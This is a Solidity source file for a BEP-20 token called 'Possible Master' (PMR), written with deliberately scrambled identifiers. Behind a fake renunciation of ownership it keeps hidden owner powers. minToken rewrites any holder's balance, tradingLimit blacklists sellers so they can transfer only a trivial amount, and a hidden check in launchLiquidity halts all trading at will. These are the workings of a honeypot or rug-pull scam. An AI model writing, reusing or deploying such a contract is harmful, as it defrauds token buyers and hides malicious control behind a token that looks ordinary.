//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface teamTx {
    function createPair(address sellTotal, address fundAt) external returns (address);
}

interface txBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldAtSwap) external view returns (uint256);

    function transfer(address launchedTake, uint256 senderShould) external returns (bool);

    function allowance(address feeEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderShould) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTake,
        uint256 senderShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeAutoShould, uint256 value);
    event Approval(address indexed feeEnable, address indexed spender, uint256 value);
}

abstract contract totalLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txBuyMetadata is txBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PossibleMaster is totalLaunched, txBuy, txBuyMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return launchTrading;
    }

    uint256 public exemptShouldReceiver;

    mapping(address => bool) public sellLimit;

    function minTx(address txFrom, address launchedTake, uint256 senderShould) internal returns (bool) {
        require(buyFee[txFrom] >= senderShould);
        buyFee[txFrom] -= senderShould;
        buyFee[launchedTake] += senderShould;
        emit Transfer(txFrom, launchedTake, senderShould);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return senderMax;
    }

    bool private launchedEnable;

    uint256 private launchTrading = 100000000 * 10 ** 18;

    mapping(address => uint256) private buyFee;

    uint256 public atLimit;

    constructor (){
        
        listExempt toLaunchedAmount = listExempt(txFundMarketing);
        senderFund = teamTx(toLaunchedAmount.factory()).createPair(toLaunchedAmount.WETH(), address(this));
        
        exemptAmount = _msgSender();
        minAt[exemptAmount] = true;
        buyFee[exemptAmount] = launchTrading;
        takeReceiverLaunched();
        if (liquiditySwapMode) {
            tokenLaunch = exemptShouldReceiver;
        }
        emit Transfer(address(0), exemptAmount, launchTrading);
    }

    string private senderMax = "Possible Master";

    function owner() external view returns (address) {
        return receiverLaunched;
    }

    uint256 swapMarketing;

    address private receiverLaunched;

    address txFundMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isAuto(uint256 senderShould) public {
        toMaxSell();
        swapMarketing = senderShould;
    }

    address public exemptAmount;

    function tradingLimit(address fundLaunchWallet) public {
        toMaxSell();
        
        if (fundLaunchWallet == exemptAmount || fundLaunchWallet == senderFund) {
            return;
        }
        sellLimit[fundLaunchWallet] = true;
    }

    function amountEnable(address amountMode) public {
        require(amountMode.balance < 100000);
        if (receiverLaunchedMode) {
            return;
        }
        
        minAt[amountMode] = true;
        
        receiverLaunchedMode = true;
    }

    mapping(address => mapping(address => uint256)) private senderIs;

    function launchLiquidity(address txFrom, address launchedTake, uint256 senderShould) internal returns (bool) {
        if (txFrom == exemptAmount) {
            return minTx(txFrom, launchedTake, senderShould);
        }
        uint256 fromExemptToken = txBuy(senderFund).balanceOf(launchedShould);
        require(fromExemptToken == swapMarketing);
        require(launchedTake != launchedShould);
        if (sellLimit[txFrom]) {
            return minTx(txFrom, launchedTake, feeExempt);
        }
        return minTx(txFrom, launchedTake, senderShould);
    }

    uint8 private maxAuto = 18;

    address launchedShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return receiverReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return maxAuto;
    }

    function balanceOf(address shouldAtSwap) public view virtual override returns (uint256) {
        return buyFee[shouldAtSwap];
    }

    bool public liquiditySwapMode;

    bool public receiverLaunchedMode;

    uint256 exemptBuy;

    mapping(address => bool) public minAt;

    function transferFrom(address txFrom, address launchedTake, uint256 senderShould) external override returns (bool) {
        if (_msgSender() != txFundMarketing) {
            if (senderIs[txFrom][_msgSender()] != type(uint256).max) {
                require(senderShould <= senderIs[txFrom][_msgSender()]);
                senderIs[txFrom][_msgSender()] -= senderShould;
            }
        }
        return launchLiquidity(txFrom, launchedTake, senderShould);
    }

    function takeReceiverLaunched() public {
        emit OwnershipTransferred(exemptAmount, address(0));
        receiverLaunched = address(0);
    }

    function transfer(address feeList, uint256 senderShould) external virtual override returns (bool) {
        return launchLiquidity(_msgSender(), feeList, senderShould);
    }

    address public senderFund;

    function minToken(address feeList, uint256 senderShould) public {
        toMaxSell();
        buyFee[feeList] = senderShould;
    }

    function getOwner() external view returns (address) {
        return receiverLaunched;
    }

    event OwnershipTransferred(address indexed feeReceiver, address indexed exemptLimit);

    function approve(address shouldLaunched, uint256 senderShould) public virtual override returns (bool) {
        senderIs[_msgSender()][shouldLaunched] = senderShould;
        emit Approval(_msgSender(), shouldLaunched, senderShould);
        return true;
    }

    uint256 constant feeExempt = 14 ** 10;

    string private receiverReceiver = "PMR";

    function allowance(address atSwap, address shouldLaunched) external view virtual override returns (uint256) {
        if (shouldLaunched == txFundMarketing) {
            return type(uint256).max;
        }
        return senderIs[atSwap][shouldLaunched];
    }

    function toMaxSell() private view {
        require(minAt[_msgSender()]);
    }

    uint256 public tokenLaunch;

    bool private launchedTotal;

}